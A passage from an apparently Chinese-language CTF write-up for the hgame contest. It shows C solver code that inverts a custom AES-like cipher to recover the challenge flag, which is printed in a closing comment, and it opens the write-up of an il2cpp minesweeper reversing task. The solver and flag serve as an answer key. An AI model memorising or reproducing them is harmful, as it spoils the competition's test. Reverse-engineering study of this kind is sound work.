        <span class="token number">0xfc</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x3e</span><span class="token punctuation">,</span> <span class="token number">0x4b</span><span class="token punctuation">,</span> <span class="token number">0xc6</span><span class="token punctuation">,</span> <span class="token number">0xd2</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x9a</span><span class="token punctuation">,</span> <span class="token number">0xdb</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token number">0xfe</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xcd</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0xf4</span><span class="token punctuation">,</span>
        <span class="token number">0x1f</span><span class="token punctuation">,</span> <span class="token number">0xdd</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0xc7</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xb1</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xec</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span>
        <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">,</span> <span class="token number">0xa9</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0xb5</span><span class="token punctuation">,</span> <span class="token number">0x4a</span><span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xc9</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0xef</span><span class="token punctuation">,</span>
        <span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">,</span> <span class="token number">0x4d</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">,</span> <span class="token number">0xf5</span><span class="token punctuation">,</span> <span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token number">0xc8</span><span class="token punctuation">,</span> <span class="token number">0xeb</span><span class="token punctuation">,</span> <span class="token number">0xbb</span><span class="token punctuation">,</span> <span class="token number">0x3c</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span>
        <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x2b</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token number">0xba</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0xd6</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x0c</span><span class="token punctuation">,</span> <span class="token number">0x7d</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">uint8_t</span> const_key<span class="token punctuation">[</span><span class="token number">257</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x43\x72\x79\x70\x74\x6F\x46\x41\x49\x4C\x55\x52\x45\x66\x6F\x72"</span>
                                 <span class="token string">"\x52\x53\x41\x32\x30\x34\x38\x4B\x65\x79\x21\x21\x21\x21\x21\x21"</span>
                                 <span class="token string">"\xBF\x8F\x84\x8D\xCB\xE0\xC2\xCC\x82\xAC\x97\x9E\xC7\xCA\xF8\xEC"</span>
                                 <span class="token string">"\x94\x27\x00\xFC\xA4\x13\x38\xB7\xC1\x6A\x19\x96\xE0\x4B\x38\xB7"</span>
                                 <span class="token string">"\x0E\x88\x2D\x6C\xC5\x68\xEF\xA0\x47\xC4\x78\x3E\x80\x0E\x80\xD2"</span>
                                 <span class="token string">"\x59\x8C\xCD\x49\xFD\x9F\xF5\xFE\x3C\xF5\xEC\x68\xDC\xBE\xD4\xDF"</span>
                                 <span class="token string">"\xA4\xC0\xB3\xEA\x61\xA8\x5C\x4A\x26\x6C\x24\x74\xA6\x62\xA4\xA6"</span>
                                 <span class="token string">"\x7D\x26\x84\x6D\x80\xB9\x71\x93\xBC\x4C\x9D\xFB\x60\xF2\x49\x24"</span>
                                 <span class="token string">"\x25\xFB\x85\x3A\x44\x53\xD9\x70\x62\x3F\xFD\x04\xC4\x5D\x59\xA2"</span>
                                 <span class="token string">"\x61\x6A\x4F\x57\xE1\xD3\x3E\xC4\x5D\x9F\xA3\x3F\x3D\x6D\xEA\x1B"</span>
                                 <span class="token string">"\x09\x7C\x2A\x1D\x4D\x2F\xF3\x6D\x2F\x10\x0E\x69\xEB\x4D\x57\xCB"</span>
                                 <span class="token string">"\x88\x89\x14\x48\x69\x5A\x2A\x8C\x34\xC5\x89\xB3\x09\xA8\x63\xA8"</span>
                                 <span class="token string">"\xEB\x87\xE8\x1C\xA6\xA8\x1B\x71\x89\xB8\x15\x18\x62\xF5\x42\xD3"</span>
                                 <span class="token string">"\x22\x6F\x38\x2E\x4B\x35\x12\xA2\x7F\xF0\x9B\x11\x76\x58\xF8\xB9"</span>
                                 <span class="token string">"\xC1\xC6\xBE\x24\x67\x6E\xA5\x55\xEE\xD6\xB0\x4D\x8C\x23\xF2\x9E"</span>
                                 <span class="token string">"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">uint8_t</span> const_iv<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token class-name">uint8_t</span> const_data<span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x91\xB3\xC1\xEB\x14\x5D\xD5\xCE\x3A\x1D\x30\xE4\x70\x6C\x6B\xD7"</span>
                                      <span class="token string">"\x69\x78\x79\x02\xA3\xA5\xDF\x1B\xFD\x1C\x02\x89\x14\x20\x7A\xFD"</span>
                                      <span class="token string">"\x24\x52\xF8\xA9\xF9\xF1\x6B\x1C\x0F\x5D\x50\x5B\xEC\x42\xD1\x8C"</span>
                                      <span class="token string">"\xB8\x12\xCF\x2C\xA9\x69\x31\x46\xFD\x9B\xEA\xDE\xC8\xBF\x94\x69"</span><span class="token punctuation">;</span>
<span class="token comment">//                                        "\x92\x16\x48\xBB\x9F\x81\xE0\x47\x7D\xEB\x40\x70\x07\x9E\x2A\x87"</span>
<span class="token comment">//                                      "\x87\xC4\x00\xCB\x2F\xC2\x09\x4C\x9E\x4B\x72\xC6\x84\xDE\x54\x7E"</span>
<span class="token comment">//                                      "\xAB\x5A\xB8\x46\x0A\xBD\x04\x1E\xFE\x62\x0A\xCC\xFB\xA0\x99\xA5"</span>
<span class="token comment">//                                      "\xA2\x83\xF4\x83\x64\x6C\xC1\xE5\xD2\x37\x9E\xC9\x9D\xF0\x28\x6C";</span>


<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">InvMixRows</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token class-name">uint8_t</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">xorKey</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>state<span class="token punctuation">,</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invColShift</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invSbox</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> iv<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span>key<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>iv<span class="token punctuation">,</span>const_iv<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>const_key<span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span>const_data<span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token function">xorKey</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">,</span>key<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token operator">-</span>j<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token function">InvMixRows</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">invColShift</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">invSbox</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">xorKey</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">-</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">xorKey</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">,</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token function">xorKey</span><span class="token punctuation">(</span>data<span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">,</span>iv<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span>data<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token comment">//    uint8_t test[4][4] = &#123;0&#125;;</span>
<span class="token comment">//    test[0][0] = 0xF1^0x72^0xEB^xtime(0x77^0xF1);</span>
<span class="token comment">//    test[0][1] = 0x77^0x72^0xEB^xtime(0xF1^0x72);</span>
<span class="token comment">//    test[0][2] = 0x77^0xF1^0xEB^xtime(0x72^0xEB);</span>
<span class="token comment">//    test[0][3] = 0x77^0xF1^0x72^xtime(0xEB^0x77);</span>
<span class="token comment">//    InvMixRows((uint8_t*)test);</span>


    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">xorKey</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>state<span class="token punctuation">,</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span>key<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invColShift</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span>state<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> a   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> b1  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> b2  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> c   <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token operator">=</span> a<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">=</span> b1<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">=</span> b2<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">invSbox</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> state<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> rsbox<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span>state<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">InvMixRows</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span>state<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token class-name">int8_t</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        a <span class="token operator">=</span> <span class="token punctuation">(</span>__int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        b <span class="token operator">=</span> <span class="token punctuation">(</span>__int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        c <span class="token operator">=</span> <span class="token punctuation">(</span>__int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        d <span class="token operator">=</span> <span class="token punctuation">(</span>__int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span>     <span class="token operator">=</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>state <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x0b</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0x0d</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">Multiply</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token class-name">uint8_t</span> <span class="token function">xtime</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> x<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="A-5-Second-Challenge"><a href="#A-5-Second-Challenge" class="headerlink" title="A 5 Second Challenge"></a>A 5 Second Challenge</h4><p>il2cpp逆向题目，没想到我技能树点歪了</p>
<p>先上图：<br>听说你叫扫雷的.jpg<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/YouLoser.png" alt="YouLoser"></p>
<p>其实我玩扫雷很菜，但是炸弹炸不死我 2333<br>为了破解这个东西，我干了好多活，最累的其实是点开 💣，再其次是画二维码。</p>
<p>那我现在从头开始讲。</p>
